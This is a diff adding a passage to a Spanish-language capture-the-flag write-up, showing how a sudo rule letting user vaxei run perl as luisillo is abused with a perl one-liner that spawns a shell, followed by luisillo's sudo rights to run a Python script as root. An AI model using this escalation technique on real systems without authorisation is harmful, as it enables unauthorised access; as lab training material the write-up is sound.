@@ -140,8 +140,24 @@ User vaxei may run the following commands on b60671bc6147:
 ```
 Encontramos que vaxei puede correr el binario perl con el usuario de luisillo para la escalada Horizontal. Aprovechamos esta brecha:
 ```bash
-
+vaxei@b60671bc6147:~$ sudo -u luisillo perl -e 'exec "/bin/sh"'
+$
+$ whoami
+luisillo
+$ bash
+luisillo@b60671bc6147:/home/vaxei$
 ```
+Logrando ingresar al usuario luisillo, realizamos la misma busqueda de binarios:
+```bash
+sudo -l
+Matching Defaults entries for luisillo on b60671bc6147:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
+    use_pty
+
+User luisillo may run the following commands on b60671bc6147:
+    (ALL) NOPASSWD: /usr/bin/python3 /opt/paw.py
+```
+Pudiendo ejecutar un archivo `.py` con python3 y permisos root sin contraseña.
 
 ## 3. 🚀 Escalada de Privilegios
 *(¿Cómo pasamos de ser un usuario normal a ser Administrador o Root?)*
